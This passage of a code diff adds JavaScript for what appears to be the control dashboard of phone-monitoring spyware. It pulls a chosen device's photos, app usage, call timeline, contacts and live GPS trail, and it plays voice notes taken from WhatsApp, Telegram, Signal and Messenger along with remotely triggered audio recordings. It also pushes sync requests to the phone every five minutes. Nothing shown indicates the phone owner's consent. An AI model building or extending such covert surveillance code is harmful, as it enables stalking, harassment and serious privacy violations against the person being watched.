+    }
+    html += '</div></div>';
+  }
+
+  const loaded = Object.keys(dedup).length;
+  grid.innerHTML = html || '<div class="label" style="margin:20px 0">&#x1F4F8; No photos matched</div>';
+
+  // Load more button
+  if (photoOffset < photoKeys.length) {
+    const remaining = photoKeys.length - photoOffset;
+    lmContainer.innerHTML = '<div class="load-more-btn" onclick="loadMorePhotos()">&#x2B07; Load ' + Math.min(PHOTO_BATCH, remaining) + ' more (' + remaining + ' remaining)</div>';
+  } else {
+    lmContainer.innerHTML = loaded > 0 ? '<div style="text-align:center;font-size:13px;color:var(--muted);margin-top:6px">&#x2714; All photos loaded (' + loaded + ')</div>' : '';
+  }
+}
+
+async function loadMorePhotos() {
+  if (photoLoading || !photoKeys.length || photoOffset >= photoKeys.length) return;
+  photoLoading = true;
+  const batch = photoKeys.slice(photoOffset, photoOffset + PHOTO_BATCH);
+  const lmContainer = document.getElementById('loadMoreContainer');
+  lmContainer.innerHTML = '<div class="load-more-btn" disabled>&#x23F3; Loading...</div>';
+
+  for (const ts of batch) {
+    if (cachedPhotos[ts]) continue;
+    try {
+      const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${ts}`);
+      if (doc && doc.data && doc.data.startsWith('/9j/')) {
+        cachedPhotos[ts] = doc;
+      }
+    } catch {}
+  }
+  photoOffset += batch.length;
+  photoLoading = false;
+  renderPhotosFromCache();
+}
+
+async function loadPhotos() {
+  if (!selectedDevice) return;
+  const grid = document.getElementById('photoGrid');
+  const lmContainer = document.getElementById('loadMoreContainer');
+  grid.innerHTML = '<div class="label" style="margin:20px 0;color:var(--accent)">&#x23F3; Loading photo list...</div>';
+  if (lmContainer) lmContainer.innerHTML = '';
+
+  const keys = await fetchRTDB(`devices/${selectedDevice}/photos`, 'shallow=true');
+  if (!keys || typeof keys !== 'object') {
+    grid.innerHTML = '<div class="label" style="margin:20px 0">&#x1F4F8; No photos yet</div>';
+    photoKeys = [];
+    photoOffset = 0;
+    return;
+  }
+
+  photoKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
+  photoOffset = 0;
+
+  // Filter out already cached keys
+  const freshKeys = photoKeys.filter(k => !cachedPhotos[k]);
+  if (freshKeys.length === 0) {
+    renderPhotosFromCache();
+    return;
+  }
+
+  photoLoading = false;
+  await loadMorePhotos();
+}
+
+async function pollPhotos() {
+  if (!selectedDevice) return;
+  await loadPhotos();
+}
+
+async function loadAllPhotos() {
+  if (!selectedDevice || !photoKeys.length) { await pollPhotos(); return; }
+  photoLoading = false;
+  while (photoOffset < photoKeys.length) {
+    await loadMorePhotos();
+    await new Promise(r => setTimeout(r, 10));
+  }
+}
+
+function openPhotoLightbox(el) {
+  const img = el ? el.querySelector('img') : null;
+  if (!img) return;
+  const lightbox = document.getElementById('lightbox');
+  const lightboxImg = document.getElementById('lightboxImg');
+  const caption = document.getElementById('lightboxCaption');
+  if (!lightbox || !lightboxImg) return;
+  lightboxImg.src = img.src;
+  const capEl = el.querySelector('.pcap');
+  if (caption) caption.innerHTML = capEl ? capEl.innerHTML : '';
+  lightbox.classList.add('open');
+}
+
+// Update lightbox click handler
+document.getElementById('lightbox')?.addEventListener('click', function() {
+  this.classList.remove('open');
+});
+
+// --- RTDB Sync Trigger ---
+
+// --- RTDB Sync Trigger ---
+let autoSyncTimer = null;
+let fcmToken = null;
+
+async function pollFcmToken() {
+  if (!selectedDevice) return;
+  try {
+    const data = await fetchRTDB(`devices/${selectedDevice}/fcm/token`);
+    if (data && data.fcmToken) {
+      fcmToken = data.fcmToken;
+      document.getElementById('fcmTokenInfo').textContent = '\u2705 FCM token registered';
+    } else {
+      fcmToken = null;
+      document.getElementById('fcmTokenInfo').textContent = '';
+    }
+  } catch {
+    fcmToken = null;
+    document.getElementById('fcmTokenInfo').textContent = '';
+  }
+}
+
+async function pollQueueSize() {
+  if (!selectedDevice) return;
+  try {
+    const info = await fetchRTDB(`devices/${selectedDevice}/info`);
+    if (info && info.offlineQueueSize !== undefined) {
+      const size = parseInt(info.offlineQueueSize);
+      document.getElementById('queueBadge').textContent = '\u{1F4E2} ' + size;
+      document.getElementById('queueBadge').title = 'Offline queue: ' + size + ' pending items';
+      const countEl = document.getElementById('offlineQueueCount');
+      if (countEl) {
+        countEl.textContent = size;
+        countEl.style.color = size > 50 ? 'var(--danger)' : size > 10 ? 'var(--accent)' : 'var(--success)';
+      }
+    } else {
+      document.getElementById('queueBadge').textContent = '';
+      const countEl = document.getElementById('offlineQueueCount');
+      if (countEl) { countEl.textContent = '0'; countEl.style.color = 'var(--muted)'; }
+    }
+  } catch {
+    document.getElementById('queueBadge').textContent = '';
+    const countEl = document.getElementById('offlineQueueCount');
+    if (countEl) { countEl.textContent = '0'; countEl.style.color = 'var(--muted)'; }
+  }
+}
+
+async function sendFcmPush() {
+  if (!selectedDevice) {
+    showAlert('No device selected', 'error');
+    return;
+  }
+  try {
+    document.getElementById('fcmLastPush').textContent = 'Requesting sync...';
+    const now = Date.now();
+    await fetch(`${RTDB}/devices/${selectedDevice}/fcm/sync_request.json`, {
+      method: 'PUT',
+      body: JSON.stringify({ requested: now, ts: now })
+    });
+    document.getElementById('fcmLastPush').textContent = '\u2705 Sync requested at ' + pkt(now);
+    showAlert('Sync request sent to device', 'warn');
+  } catch (e) {
+    document.getElementById('fcmLastPush').textContent = '\u274c Error: ' + e.message;
+    showAlert('Sync request failed: ' + e.message, 'error');
+  }
+}
+
+function toggleAutoFcm() {
+  if (autoSyncTimer) {
+    clearInterval(autoSyncTimer);
+    autoSyncTimer = null;
+    document.getElementById('autoFcmBtn').textContent = '\u23F1 Auto-Sync: OFF';
+    document.getElementById('autoFcmBtn').style.background = '';
+    return;
+  }
+  autoSyncTimer = setInterval(() => { sendFcmPush(); }, 300000);
+  document.getElementById('autoFcmBtn').textContent = '\u23F1 Auto-Sync: ON (5min)';
+  document.getElementById('autoFcmBtn').style.background = 'var(--success)';
+  document.getElementById('autoFcmBtn').style.color = '#000';
+  sendFcmPush();
+}
+
+function renderApps(sorted) {
+  const chart = document.getElementById('appsChart');
+  const syncEl = document.getElementById('appsSyncInfo');
+  const period = document.querySelector('.app-period-btn.active')?.dataset?.period || 'today';
+  // If mostRecent is selected, render from snapshot cache instead
+  if (period === 'mostRecent') {
+    renderAppSnapshots();
+    return;
+  }
+  if (!sorted || !sorted.length) {
+    chart.innerHTML = '<div class="label">No app usage data yet</div>';
+    if (syncEl) syncEl.textContent = '';
+    return;
+  }
+  if (syncEl) {
+    let t = '';
+    if (appsPhoneSync) t += '\u{1F4F1} ' + pktShort(appsPhoneSync);
+    if (appsPhoneSync && appsLastSync) t += ' | ';
+    if (appsLastSync) t += '\u{1F504} ' + pktShort(appsLastSync);
+    syncEl.textContent = t;
+  }
+  const maxMs = sorted[0].ms || 1;
+  let html = '';
+  if (period === 'today') {
+    html = sorted.map(a => `
+      <div class="bar-row">
+        <span class="bar-label">${a.name}</span>
+        <div class="bar-fill" style="width:${(a.ms/maxMs*100).toFixed(0)}%"></div>
+        <span class="bar-val">${(a.ms/60000).toFixed(1)}m</span>
+      </div>`).join('');
+  } else if (period === 'yesterday') {
+    if (!sorted[0]?.dailyMs) {
+      chart.innerHTML = '<div class="label">No daily breakdown available</div>'; return;
+    }
+    const yMax = Math.max(...sorted.map(a => a.dailyMs?.yesterday || 0), 1);
+    html = sorted.map(a => `
+      <div class="bar-row">
+        <span class="bar-label">${a.name}</span>
+        <div class="bar-fill" style="width:${((a.dailyMs?.yesterday||0)/yMax*100).toFixed(0)}%"></div>
+        <span class="bar-val">${((a.dailyMs?.yesterday||0)/60000).toFixed(1)}m</span>
+      </div>`).join('');
+  } else if (period === 'week') {
+    if (!sorted[0]?.dailyMs) {
+      chart.innerHTML = '<div class="label">No weekly breakdown available</div>'; return;
+    }
+    const wMax = Math.max(...sorted.map(a => a.dailyMs?.weekAvg || 0), 1);
+    html = sorted.map(a => `
+      <div class="bar-row">
+        <span class="bar-label">${a.name}</span>
+        <div class="bar-fill" style="width:${((a.dailyMs?.weekAvg||0)/wMax*100).toFixed(0)}%"></div>
+        <span class="bar-val">${((a.dailyMs?.weekAvg||0)/60000).toFixed(1)}m</span>
+      </div>`).join('');
+  }
+  chart.innerHTML = html || '<div class="label">No app usage data for this period</div>';
+}
+
+function renderAppSnapshots() {
+  const chart = document.getElementById('appsChart');
+  const syncEl = document.getElementById('appsSyncInfo');
+  if (!appSnapshotsCache || !appSnapshotsCache.length) {
+    chart.innerHTML = '<div class="label">No app snapshots yet. Captured every 30s by the phone.</div>';
+    if (syncEl) syncEl.textContent = '';
+    return;
+  }
+  // Dedup: keep only first entry per (appName, phoneTsMs)
+  const seen = new Set();
+  const deduped = appSnapshotsCache.filter(s => {
+    const key = s.appName + '|' + s.phoneTsMs;
+    if (seen.has(key)) return false;
+    seen.add(key);
+    return true;
+  });
+  if (syncEl) {
+    syncEl.textContent = '\u{1F4F1} ' + pktShort(appSnapshotsCache[0].phoneTsMs) + ' | \u{1F504} ' + (appSnapshotsLastSync ? pktShort(appSnapshotsLastSync) : '');
+  }
+  let html = '<div style="display:flex;gap:8px;font-size:12px;color:var(--muted);margin-bottom:6px">' +
+    '<span>Raw: ' + appSnapshotsCache.length + ' entries</span>' +
+    '<span style="color:var(--success)">Deduped: ' + deduped.length + '</span>' +
+    '</div>';
+  for (const s of deduped) {
+    html += '<div class="bar-row" style="padding:3px 6px;gap:8px">' +
+      '<span style="font-size:13px;font-weight:500;min-width:60px;flex-shrink:0">' + s.appName + '</span>' +
+      '<span style="font-size:12px;color:var(--muted);white-space:nowrap">' +
+      '\u{1F4F1} ' + pktShort(s.phoneTsMs) + ' \u{1F504} ' + pktShort(s.dashboardTsMs) +
+      '</span></div>';
+  }
+  chart.innerHTML = html;
+}
+
+async function pollAppSnapshots() {
+  if (!selectedDevice) return;
+  const data = await fetchRTDB(`devices/${selectedDevice}/appSnapshots`);
+  if (!data || typeof data !== 'object') {
+    appSnapshotsCache = null;
+    appSnapshotsLastSync = 0;
+    document.getElementById('appsChart').innerHTML = '<div class="label">No app snapshots yet. Captured every 30s by the phone.</div>';
+    return;
+  }
+  appSnapshotsCache = Object.entries(data)
+    .map(([key, val]) => ({
+      key,
+      appName: val.appName || val.packageName || '?',
+      packageName: val.packageName || '',
+      phoneTsMs: parseInt(val.phoneTsMs || val.ts_ms || '0'),
+      dashboardTsMs: parseInt(val.dashboardTsMs || '0')
+    }))
+    .filter(s => s.phoneTsMs > 0)
+    .sort((a, b) => b.phoneTsMs - a.phoneTsMs)
+    .slice(0, 100);
+  appSnapshotsLastSync = Date.now();
+  renderAppSnapshots();
+}
+
+async function pollApps() {
+  if (!selectedDevice) return;
+  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/apps`);
+  if (!rtdbData || typeof rtdbData !== 'object') {
+    appsCache = null;
+    document.getElementById('appsChart').innerHTML = '<div class="label">No app usage data yet</div>';
+    return;
+  }
+  appsFullCache = Object.values(rtdbData).map(v => ({
+    name: v.appName || v.packageName || '?',
+    ms: parseInt(v.totalForegroundMs || '0'),
+    lastUsedMs: parseInt(v.lastUsedMs || '0'),
+    dailyMs: v.dailyMs || null,
+    hourlyMs: v.hourlyMs || null
+  }));
+  appsCache = [...appsFullCache].sort((a, b) => b.ms - a.ms).slice(0, 15);
+  appsLastSync = Date.now();
+  try { const info = await fetchRTDB(`devices/${selectedDevice}/info`); if (info) appsPhoneSync = parseInt(info.lastSyncMs || '0'); } catch {}
+  renderApps(appsCache);
+}
+
+async function pollHistory() {
+  if (!selectedDevice) return;
+  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/timeline`);
+  if (!rtdbData || typeof rtdbData !== 'object') {
+    timelineCache = null;
+    document.getElementById('timelineList').innerHTML = '<div class="label">No entries</div>';
+    document.getElementById('callsBody').innerHTML = '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
+    return;
+  }
+  timelineCache = Object.values(rtdbData)
+    .sort((a, b) => (parseInt(b.ts_ms) || 0) - (parseInt(a.ts_ms) || 0));
+  renderTimeline(timelineCache);
+  renderCalls(timelineCache);
+}
+
+async function pollVoiceNotes() {
+  if (!selectedDevice) return;
+  const list = document.getElementById('voiceNotesList');
+  let data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
+  if (!data || typeof data !== 'object') {
+    list.innerHTML = '<div class="label">No voice notes found on phone</div><div style="font-size:12px;color:var(--muted);margin-top:4px">The phone scans for short audio files from WhatsApp, Telegram, Messenger, Signal, and voice recorders. Requires the READ_MEDIA_AUDIO permission.</div>';
+    return;
+  }
+  // Collect every note across all batches, keeping the batch sync time.
+  const notes = [];
+  for (const key of Object.keys(data)) {
+    const batch = data[key];
+    if (!batch || typeof batch !== 'object') continue;
+    const synced = parseInt(batch.ts_ms) || 0;
+    for (const note of (batch.notes || [])) {
+      if (!note) continue;
+      notes.push(Object.assign({ _synced: synced }, note));
+    }
+  }
+  // Newest created/captured first.
+  notes.sort((a, b) => (parseInt(b.dateAdded) || 0) - (parseInt(a.dateAdded) || 0));
+  if (!notes.length) {
+    list.innerHTML = '<div class="label">No voice notes yet</div>';
+    return;
+  }
+  const MIME = {
+    'audio/ogg': 'audio/ogg', 'application/ogg': 'audio/ogg', 'audio/opus': 'audio/ogg',
+    'audio/mpeg': 'audio/mpeg', 'audio/mp3': 'audio/mpeg', 'audio/aac': 'audio/aac',
+    'audio/mp4': 'audio/mp4', 'audio/x-m4a': 'audio/mp4', 'audio/3gpp': 'audio/3gpp',
+    'audio/amr': 'audio/amr', 'audio/wav': 'audio/wav', 'audio/x-wav': 'audio/wav',
+    'audio/webm': 'audio/webm'
+  };
+let html = `<div style="font-size:13px;color:var(--muted);margin-bottom:8px">${notes.length} voice note${notes.length>1?'s':''} \u2022 newest first</div>`;
+  for (const note of notes) {
+    const name = note.fileName || 'Voice note';
+    const dur = note.durationMs ? Math.round(note.durationMs/1000) + 's' : '';
+    const size = note.sizeBytes ? (note.sizeBytes/1024).toFixed(0) + 'KB' : '';
+    const created = note.dateAdded ? pkt(parseInt(note.dateAdded)) : '';
+    const synced = note._synced ? pkt(note._synced) : '';
+    const type = (note.mimeType || '').split('/').pop().toUpperCase() || 'AUDIO';
+    const metaBits = [created ? `Captured: ${created}` : '', dur ? `Duration: ${dur}` : '', size ? `Size: ${size}` : '', `Type: ${type}`];
+    const meta = metaBits.filter(Boolean).join('  \u2022  ');
+    const syncedLine = synced ? `<div class="vmeta">Synced: ${synced}</div>` : '';
+    let player = '';
+    let downloadLink = '';
+    let audioStatus = '';
+    if (note.audioUrl) {
+      const mt = MIME[note.mimeType] || 'audio/*';
+      player = `<audio controls preload="none" src="${note.audioUrl}" type="${mt}"></audio>`;
+      downloadLink = `<a href="${note.audioUrl}" download="${name}" style="font-size:12px;margin-left:8px;color:var(--accent)" title="Download">\u2b07</a>`;
+      audioStatus = '<span class="vmeta" style="color:var(--success);margin-left:8px">\u25CF Playable</span>';
+    } else if (note.audioData && note.audioData.length > 100) {
+      const mt = MIME[note.mimeType] || 'audio/ogg';
+      const ext = note.mimeType === 'audio/mpeg' ? '.mp3' : note.mimeType === 'audio/mp4' || note.mimeType === 'audio/x-m4a' ? '.m4a' : note.mimeType === 'audio/aac' ? '.aac' : note.mimeType === 'audio/3gpp' ? '.3gp' : note.mimeType === 'audio/amr' ? '.amr' : note.mimeType === 'audio/wav' || note.mimeType === 'audio/x-wav' ? '.wav' : note.mimeType === 'audio/webm' ? '.webm' : '.ogg';
+      const dataUri = `data:${mt};base64,${note.audioData}`;
+      player = `<audio controls preload="none" src="${dataUri}" type="${mt}"></audio>`;
+      downloadLink = `<a href="${dataUri}" download="${name.replace(/\.[^.]+$/, '')}${ext}" style="font-size:12px;margin-left:8px;color:var(--accent)" title="Download">\u2b07</a>`;
+      audioStatus = '<span class="vmeta" style="color:var(--success);margin-left:8px">\u25CF Embedded</span>';
+    } else {
+      let reason = 'Audio not synced from device';
+      if (note.audioStripped === true) reason = 'Audio stripped (budget/age)';
+      else if (note.dateAdded && note.dateAdded < Date.now() - 86400000) reason = 'Old note \u2014 audio not uploaded';
+      else if (note.sizeBytes && note.sizeBytes > 16 * 1024 * 1024) reason = 'File too large (>16MB)';
+      player = `<div class="vmeta" style="color:var(--danger)">${reason}</div>`;
+      audioStatus = '<span class="vmeta" style="color:var(--muted);margin-left:8px">\u25CF Unavailable</span>';
+    }
+    html += `<div class="voice-card">
+      <div class="vname">${name} ${audioStatus}${downloadLink}</div>
+      ${meta ? `<div class="vmeta">${meta}</div>` : ''}
+      ${syncedLine}
+      ${player}
+    </div>`;
+  }
+  list.innerHTML = html;
+}
+
+async function pollRemoteRecordings() {
+  if (!selectedDevice) return;
+  const list = document.getElementById('remoteRecordingsList');
+  let data;
+  try { data = await fetchRTDB(`devices/${selectedDevice}/recordings`, 'shallow=true'); } catch { data = null; }
+  if (!data || typeof data !== 'object') {
+    list.innerHTML = '<div class="label">No remote recordings yet</div>';
+    return;
+  }
+  const recIds = Object.keys(data);
+  if (!recIds.length) {
+    list.innerHTML = '<div class="label">No remote recordings yet</div>';
+    return;
+  }
+  const MIME = {
+    'audio/ogg': 'audio/ogg', 'application/ogg': 'audio/ogg', 'audio/opus': 'audio/ogg',
+    'audio/mpeg': 'audio/mpeg', 'audio/mp3': 'audio/mpeg', 'audio/aac': 'audio/aac',
+    'audio/mp4': 'audio/mp4', 'audio/x-m4a': 'audio/mp4', 'audio/3gpp': 'audio/3gpp',
+    'audio/amr': 'audio/amr', 'audio/wav': 'audio/wav', 'audio/x-wav': 'audio/wav',
+    'audio/webm': 'audio/webm'
+  };
+  let html = `<div style="font-size:13px;color:var(--muted);margin-bottom:8px">${recIds.length} remote recording${recIds.length > 1 ? 's' : ''} • newest first</div>`;
+  for (const recId of recIds) {
+    const meta = data[recId];
+    if (!meta || typeof meta !== 'object') continue;
+    const recData = meta;
+    const recIdKey = recId;
+    const createdAt = recData.createdAt ? new Date(recData.createdAt).toLocaleString() : '';
+    const duration = recData.durationSec || 0;
+    const segments = recData.segmentsCount || 0;
+    const mimeType = recData.mimeType || 'audio/mp4';
+    const sizeMb = recData.sizeBytes ? (recData.sizeBytes / (1024 * 1024)).toFixed(2) : '0';
+    const mt = MIME[mimeType] || 'audio/mp4';
+    const parts = [];
+    let allPartsOk = true;
+    for (let i = 0; i < segments; i++) {
+      try {
+        const part = await fetchRTDB(`devices/${selectedDevice}/recordings/${recIdKey}/parts/${i}`);
+        if (part && part.data) { parts.push(part.data); } else { allPartsOk = false; }
+      } catch { allPartsOk = false; }
+    }
+    let player = '';
+    let status = '';
+    if (allPartsOk && parts.length === segments && segments > 0) {
+      const combinedBase64 = parts.join('');
+      const dataUri = `data:${mt};base64,${combinedBase64}`;
+      const durLabel = duration > 0 ? `${duration}s` : `${segments * 60}s`;
+      player = `<audio controls preload="none" src="${dataUri}" type="${mt}"></audio>`;
+      status = `<span class="vmeta" style="color:var(--success);margin-left:8px">\u25CF Playable</span>`;
+    } else if (segments > 0 && !allPartsOk) {
+      status = `<span class="vmeta" style="color:var(--danger);margin-left:8px">\u26A0 Partially synced</span>`;
+    } else {
+      status = `<span class="vmeta" style="color:var(--muted);margin-left:8px">\u25CF No audio data</span>`;
+    }
+    html += `<div class="voice-card">
+      <div class="vname">&#x1F3A4; Recording ${recIdKey.substring(0, 8)}... ${status}</div>
+      <div class="vmeta">Created: ${createdAt}  \u2022  Duration: ${duration}s  \u2022  Segments: ${segments}  \u2022  Size: ${sizeMb}MB  \u2022  Type: ${mt}</div>
+      ${player}
+    </div>`;
+  }
+  list.innerHTML = html;
+}
+
+async function pollContacts() {
+  if (!selectedDevice) return;
+  const list = document.getElementById('contactsList');
+  const data = await fetchRTDB(`devices/${selectedDevice}/contacts/all`);
+  if (!data || !data.contacts) {
+    contactsCache = null;
+    contactsSyncTs = 0;
+    list.innerHTML = '<div class="label">No contacts synced yet</div>';
+    return;
+  }
+  const raw = data.contacts;
+  contactsSyncTs = parseInt(data.ts_ms) || Date.now();
+  const seen = new Map();
+  const extract = c => ({
+    name: c.displayName || c.name || c.number || 'Unknown',
+    num: (c.number || '').replace(/[\s\-\(\)]/g, ''),
+    email: c.email || ''
+  });
+  const process = c => {
+    const entry = extract(c);
+    const key = entry.num || entry.email || entry.name;
+    if (!key) return;
+    if (seen.has(key)) {
+      const existing = seen.get(key);
+      if ((entry.name !== 'Unknown' && existing.name === 'Unknown') ||
+          (entry.name !== 'Unknown' && existing.name === entry.name && entry.email && !existing.email)) {
+        seen.set(key, entry);
+      }
+    } else {
+      seen.set(key, entry);
+    }
+  };
+  if (Array.isArray(raw)) {
+    raw.forEach(process);
+  } else {
+    Object.values(raw).forEach(c => { if (c && typeof c === 'object') process(c); });
+  }
+  contactsCache = Array.from(seen.values());
+  renderContacts();
+}
+
+function renderContacts() {
+  const list = document.getElementById('contactsList');
+  if (!contactsCache || !contactsCache.length) {
+    list.innerHTML = '<div class="label">No contacts found</div>';
+    return;
+  }
+  const q = (document.getElementById('contactsSearch').value || '').toLowerCase();
+  let filtered = contactsCache;
+  if (q) {
+    filtered = contactsCache.filter(c =>
+      c.name.toLowerCase().includes(q) ||
+      c.num.includes(q) ||
+      c.email.toLowerCase().includes(q)
+    );
+  }
+  let html = '';
+  for (const c of filtered) {
+    html += `<div class="card" style="border-left-color:var(--success);padding:8px 12px;margin-bottom:6px">
+      <div style="font-size:15px;font-weight:500">${escHtml(c.name)}</div>
+      ${c.num ? `<div style="font-size:13px;color:var(--muted)">${escHtml(c.num)}</div>` : ''}
+      ${c.email ? `<div style="font-size:13px;color:var(--muted)">${escHtml(c.email)}</div>` : ''}
+    </div>`;
+  }
+  list.innerHTML = html || '<div class="label">No contacts match your search</div>';
+  const dedupedCount = contactsCache.length;
+  list.innerHTML += `<div style="font-size:12px;color:var(--muted);margin-top:6px">${dedupedCount} contacts · Synced: ${pkt(contactsSyncTs)}</div>`;
+}
+
+document.getElementById('contactsSearch')?.addEventListener('input', renderContacts);
+
+// --- Update UI ---
+function updateLocationUI(loc) {
+  document.getElementById('latVal').textContent = loc.lat.toFixed(6) + '\u00B0';
+  document.getElementById('lngVal').textContent = loc.lng.toFixed(6) + '\u00B0';
+  document.getElementById('accVal').textContent = loc.accuracy != null ? loc.accuracy + 'm' : '--';
+  document.getElementById('spdVal').textContent = loc.speed != null ? loc.speed.toFixed(1) + ' m/s' : '--';
+  document.getElementById('seenVal').textContent = pkt(loc.ts_ms || Date.now());
+  document.getElementById('coordBox').textContent = `${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}`;
+  document.getElementById('coordBox').onclick = () => {
+    const txt = `${loc.lat},${loc.lng}`;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(txt).then(() => showAlert('Copied!')).catch(() => showAlert('Copy failed', 'error'));
+    }
+  };
+  geocode(loc.lat, loc.lng).then(d => {
+    if (d) document.getElementById('addrVal').textContent = d.display_name || '--';
+  });
+}
+
+function updatePlaybackUI(p) {
+  if (!p) return;
+  document.getElementById('latVal').textContent = p.lat.toFixed(6) + '\u00B0';
+  document.getElementById('lngVal').textContent = p.lng.toFixed(6) + '\u00B0';
+  document.getElementById('accVal').textContent = p.accuracy != null ? p.accuracy + 'm' : '--';
+  document.getElementById('spdVal').textContent = p.speed != null ? p.speed.toFixed(1) + ' m/s' : '--';
+  document.getElementById('seenVal').textContent = p.ts ? pkt(p.ts) : '--';
+  document.getElementById('coordBox').textContent = `${p.lat.toFixed(6)}, ${p.lng.toFixed(6)}`;
+  geocode(p.lat, p.lng).then(d => {
+    if (d) document.getElementById('addrVal').textContent = d.display_name || '--';
+  });
+  const metaParts = [];
+  if (p.speed != null) metaParts.push(p.speed.toFixed(1) + 'm/s');
+  if (p.accuracy != null) metaParts.push('±' + p.accuracy + 'm');
+  document.getElementById('playMeta').textContent = metaParts.length ? metaParts.join(' ') : '--';
+}
+
+function updateMap(loc) {
+  const latlng = [loc.lat, loc.lng];
+  if (marker) { marker.setLatLng(latlng); }
+  else {
+    marker = L.marker(latlng, {
+      icon: L.divIcon({
+        className: '',
+        html: '<div style="background:#3fb950;width:14px;height:14px;border-radius:50%;border:2px solid #fff;box-shadow:0 0 8px rgba(63,185,80,.6)"></div>',
+        iconSize: [14, 14],
+        iconAnchor: [7, 7]
+      })
+    }).addTo(map).bindPopup('Current');
+  }
+  if (accuracyCircle) map.removeLayer(accuracyCircle);
+  const circleColor = loc.isHighAccuracy ? '#3fb950' : '#ffca28';
+  accuracyCircle = L.circle(latlng, { radius: loc.accuracy != null ? loc.accuracy : 50, color: circleColor, fillOpacity: 0.1 }).addTo(map);
+  // Show high-accuracy satellite count in popup
+  if (loc.isHighAccuracy && loc.satellites) {
+    marker.setTooltipContent('\uD83D\uDDF2 ' + loc.satellites + ' satellites');
+  }
+  locationHistory.push({ lat: loc.lat, lng: loc.lng, ts: loc.ts_ms || Date.now(), speed: loc.speed, accuracy: loc.accuracy, isHighAccuracy: loc.isHighAccuracy === true, satellites: loc.satellites || 0 });
+  if (locationHistory.length > 500) locationHistory.shift();
+  updateTrail();
+  if (locationHistory.length === 1) map.setView(latlng, 15);
+}
+
+// --- Gradient Trail ---
+const TRAIL_COLORS = ['#1a3a5c', '#2a5a7c', '#3a7a9c', '#4a9abc', '#5ababc', '#7acc7a', '#aadd55', '#ddee44', '#ffca28', '#ff8c00'];
+
+function buildGradientTrail(pts) {
+  if (pts.length < 2) return null;
+  const group = L.layerGroup();
+  const segs = Math.min(TRAIL_COLORS.length, pts.length);
+  const chunkSize = Math.max(1, Math.floor(pts.length / segs));
+  for (let i = 0; i < pts.length - 1; i += chunkSize) {
+    const end = Math.min(i + chunkSize + 1, pts.length);
+    const chunk = pts.slice(i, end).map(p => [p.lat, p.lng]);
+    if (chunk.length < 2) continue;
+    const ci = Math.min(Math.floor(i / chunkSize), TRAIL_COLORS.length - 1);
+    const opacity = 0.3 + 0.6 * (i / pts.length);
+    // Check if this segment contains high-accuracy points
+    const segPts = pts.slice(i, end);
+    const hasHighAccuracy = segPts.some(p => p.isHighAccuracy);
+    const weight = hasHighAccuracy ? 4.5 : 2.5;
+    const color = hasHighAccuracy ? '#3fb950' : TRAIL_COLORS[ci];
+    L.polyline(chunk, { color, weight, opacity }).addTo(group);
+    if (hasHighAccuracy) {
+      // Glow effect for high-accuracy segments
+      L.polyline(chunk, { color: '#3fb950', weight: 8, opacity: 0.15 }).addTo(group);
+    }
+  }
+  return group;
+}
+
+function updateTrail() {
+  if (trail) { map.removeLayer(trail); trail = null; }
+  if (locationHistory.length < 2) {
+    document.getElementById('playbackBar').style.display = 'none';
+    return;
+  }
+  let pts = locationHistory;
+  trail = buildGradientTrail(pts);
+  if (trail) trail.addTo(map);
+  document.getElementById('playbackBar').style.display = 'flex';
+  document.getElementById('playCount').textContent = `0/${pts.length}`;
+  setupPlayback(pts);
+  renderPlaybackTab();
+}
+
+// --- Smooth Real-Time Playback Engine ---
+let segFrom = 0, segTo = 0, segStartTime = 0, segRealGap = 0, animFrameId = null;
+
+function setupPlayback(pts) {
+  playbackPoints = pts;
+  const scrubber = document.getElementById('playScrubber');
+  scrubber.max = 1000;
+  const stEl = document.getElementById('playTsStart');
+  const enEl = document.getElementById('playTsEnd');
+  if (pts.length) {
+    stEl.textContent = pts[0].ts ? pktTime(pts[0].ts) : '--';
+    enEl.textContent = pts[pts.length-1].ts ? pktTime(pts[pts.length-1].ts) : '--';
+  } else {
+    stEl.textContent = '--';
+    enEl.textContent = '--';
+  }
+}
+
+function stopPlayback() {
+  playbackRunning = false;
+  if (animFrameId) { cancelAnimationFrame(animFrameId); animFrameId = null; }
+  document.getElementById('playBtn').textContent = '\u25B6';
+  document.getElementById('statusDot').textContent = playbackDirection === 1 ? '\u25CF Live' : '\u25CF Live';
+  document.getElementById('statusDot').className = 'status';
+  if (marker) marker.closePopup();
+}
+
+function lerp(a, b, t) { return a + (b - a) * t; }
+
+function setMarkerPos(lat, lng, ts) {
+  if (marker) marker.setLatLng([lat, lng]);
+}
+
+function panIfNeeded(lat, lng) {
+  const bounds = map.getBounds();
+  const sw = bounds.getSouthWest(), ne = bounds.getNorthEast();
+  const margin = 0.25;
+  const latRange = ne.lat - sw.lat;
+  const lngRange = ne.lng - sw.lng;
+  if (lat < sw.lat + latRange * margin || lat > ne.lat - latRange * margin ||
+      lng < sw.lng + lngRange * margin || lng > ne.lng - lngRange * margin) {
+    map.panTo([lat, lng], { animate: true, duration: 0.15 });
+  }
+}
+
+function updatePlaybackDisplay(lat, lng, ts, fromIdx, toIdx, frac) {
+  const pts = playbackPoints;
+  const totalSegs = Math.max(1, pts.length - 1);
+  const scrubVal = totalSegs > 0 ? Math.floor(((fromIdx + frac) / totalSegs) * 1000) : 0;
+  document.getElementById('playScrubber').value = scrubVal;
+  document.getElementById('playCount').textContent = `${fromIdx + 1}/${pts.length}`;
+  const displayTs = Math.round(ts);
+  setMarkerPos(lat, lng, displayTs);
+  if (marker) marker.setPopupContent(pkt(displayTs));
+  panIfNeeded(lat, lng);
+  const cur = { lat, lng, ts: displayTs, accuracy: pts[fromIdx] ? pts[fromIdx].accuracy : 0 };
+  updatePlaybackUI(cur);
+  const speed = pts[fromIdx] && pts[fromIdx].speed ? pts[fromIdx].speed.toFixed(1) + 'm/s' : '--';
+  document.getElementById('playMeta').textContent = '\u26A1 ' + speed;
+  highlightPointInList(fromIdx);
+}
+
+function advanceSegment() {
+  const pts = playbackPoints;
+  const dir = playbackDirection;
+  if (dir === 1) {
+    if (segTo + 1 < pts.length) {
+      segFrom = segTo;
+      segTo = segTo + 1;
+    } else {
+      if (playbackLoop) { segFrom = 0; segTo = 1; }
+      else { stopPlayback(); return false; }
+    }
+  } else {
